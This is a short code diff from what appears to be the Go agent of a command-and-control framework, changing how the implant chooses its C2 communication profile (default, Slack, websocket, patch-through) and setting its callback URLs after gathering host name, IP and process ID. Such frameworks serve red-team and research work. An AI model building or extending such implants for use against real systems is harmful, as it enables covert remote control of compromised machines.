@@ -39,11 +39,8 @@ func main() {
 	hostname, _ := os.Hostname()
 	currIP := functions.GetCurrentIPAddress()
 	currPid := os.Getpid()
-	// Modify the profile used by changing this line
-	// profile := profiles.C2Patchthrough{}
-	profile := profiles.C2Default{}
-	// profile := profiles.C2Slack{}
-	// profile := profiles.C2Websocket{}
+	p := profiles.NewInstance()
+	profile := p.(profiles.Profile)
 	profile.SetUniqueID(profiles.UUID)
 	profile.SetURL(profiles.BaseURL)
 	profile.SetURLs(profiles.BaseURLs)
